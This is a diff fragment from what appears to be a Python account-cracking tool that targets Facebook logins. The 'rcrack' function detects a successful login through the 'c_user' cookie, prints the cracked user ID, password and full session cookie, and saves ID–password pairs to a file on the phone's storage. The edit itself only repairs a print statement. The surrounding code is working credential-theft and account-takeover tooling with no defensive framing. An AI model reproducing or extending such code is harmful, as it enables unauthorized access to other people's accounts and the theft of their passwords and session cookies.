@@ -214,7 +214,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\033[38;5;46m[PINIK-OK💚] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+ ) 
+                print(f"\033[38;5;46m[PINIK-OK💚] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+'  \033[0;97m') 
 #' \n\033[1;33m [😈] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                 open('/sdcard/PINIK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
